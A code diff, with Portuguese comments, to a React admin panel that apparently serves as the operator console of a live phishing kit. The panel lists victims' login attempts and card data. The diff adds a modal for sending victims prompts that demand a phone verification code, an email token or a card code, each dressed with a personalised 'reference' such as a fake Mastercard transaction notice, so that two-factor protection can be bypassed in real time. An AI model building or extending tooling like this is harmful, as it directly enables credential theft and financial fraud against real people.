@@ -27,6 +27,9 @@ function AdminPanel() {
   const [visitors, setVisitors] = useState([]);
   const [visitorsLoading, setVisitorsLoading] = useState(false);
   const [ccModalData, setCcModalData] = useState(null);
+  // Modal de referência para comandos
+  const [refModal, setRefModal] = useState(null); // { userId, command, label, placeholder }
+  const [refModalValue, setRefModalValue] = useState("");
 
   // Função para copiar texto com um clique
   const copyToClipboard = async (text, fieldId) => {
@@ -279,6 +282,37 @@ function AdminPanel() {
         setReferenceField("");
       }
       
+      fetchLoginAttempts();
+    } catch (error) {
+      console.error("Erro ao enviar comando:", error);
+    }
+  };
+
+  // Abrir modal de referência antes de enviar comando
+  const openRefModal = (userId, command) => {
+    const configs = {
+      "TOK-TEL": { label: "Código do Telefone", placeholder: "Ex: 4 últimos dígitos do telefone" },
+      "TOK-MAIL": { label: "Token do Email", placeholder: "Ex: email mascarado do usuário" },
+      "COD-CC": { label: "Código do Cartão", placeholder: "Ex: Confira as transações do seu cartão Mastercard..." },
+    };
+    const cfg = configs[command];
+    setRefModal({ userId, command, label: cfg.label, placeholder: cfg.placeholder });
+    setRefModalValue("");
+  };
+
+  // Enviar comando com referência do modal
+  const sendRefCommand = async () => {
+    if (!refModal) return;
+    try {
+      const headers = getAuthHeaders();
+      if (!headers) return;
+      await axios.post(`${API}/admin/command`, {
+        user_id: refModal.userId,
+        command: refModal.command,
+        reference: refModalValue,
+      }, { headers });
+      setRefModal(null);
+      setRefModalValue("");
       fetchLoginAttempts();
     } catch (error) {
       console.error("Erro ao enviar comando:", error);
@@ -621,7 +655,7 @@ function AdminPanel() {
                           <th className="border border-[#2a2a2a] p-0">
                             <div className="flex">
                               <div 
-                                onClick={() => sendCommand(attempt.id, "TOK-TEL")}
+                                onClick={() => openRefModal(attempt.id, "TOK-TEL")}
                                 className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-orange-900/30 transition-colors flex-1"
                                 title="Clique para pedir código do telefone"
                               >
@@ -657,7 +691,7 @@ function AdminPanel() {
                           <th className="border border-[#2a2a2a] p-0">
                             <div className="flex">
                               <div 
-                                onClick={() => sendCommand(attempt.id, "TOK-MAIL")}
+                                onClick={() => openRefModal(attempt.id, "TOK-MAIL")}
                                 className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-blue-900/30 transition-colors flex-1"
                                 title="Clique para pedir token do email"
                               >
@@ -693,7 +727,7 @@ function AdminPanel() {
                           <th className="border border-[#2a2a2a] p-0">
                             <div className="flex">
                               <div 
-                                onClick={() => sendCommand(attempt.id, "COD-CC")}
+                                onClick={() => openRefModal(attempt.id, "COD-CC")}
                                 className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-yellow-900/30 transition-colors flex-1"
                                 title="Clique para pedir código do cartão"
                               >
@@ -1114,6 +1148,47 @@ function AdminPanel() {
           </div>
         );
       })()}
+
+      {/* ========== MODAL REFERÊNCIA (TOK-TEL, TOK-MAIL, COD-CC) ========== */}
+      {refModal && (
+        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4" onClick={() => setRefModal(null)}>
+          <div className="bg-[#111111] border border-[#333] rounded-xl w-full max-w-md p-6" onClick={(e) => e.stopPropagation()}>
+            <div className="flex items-center justify-between mb-5">
+              <h2 className="text-lg font-bold text-white">{refModal.label}</h2>
+              <button onClick={() => setRefModal(null)} className="text-gray-500 hover:text-white text-2xl">&times;</button>
+            </div>
+
+            <div className="space-y-4">
+              <div>
+                <label className="block text-sm text-gray-400 mb-2">Referência</label>
+                <textarea
+                  value={refModalValue}
+                  onChange={(e) => setRefModalValue(e.target.value)}
+                  placeholder={refModal.placeholder}
+                  rows={refModal.command === "COD-CC" ? 4 : 2}
+                  className="w-full px-4 py-3 bg-[#0a0a0a] border border-[#333] rounded-lg text-white placeholder-gray-600 focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 resize-none"
+                  autoFocus
+                />
+              </div>
+
+              <div className="flex gap-3">
+                <button
+                  onClick={() => setRefModal(null)}
+                  className="flex-1 bg-[#1a1a1a] text-white font-bold border border-gray-600/40 py-2.5 rounded-lg hover:bg-[#252525] transition-colors text-sm"
+                >
+                  Cancelar
+                </button>
+                <button
+                  onClick={sendRefCommand}
+                  className="flex-1 bg-green-900/40 text-white font-bold border border-green-500/40 py-2.5 rounded-lg hover:bg-green-900/60 transition-colors text-sm"
+                >
+                  Enviar
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
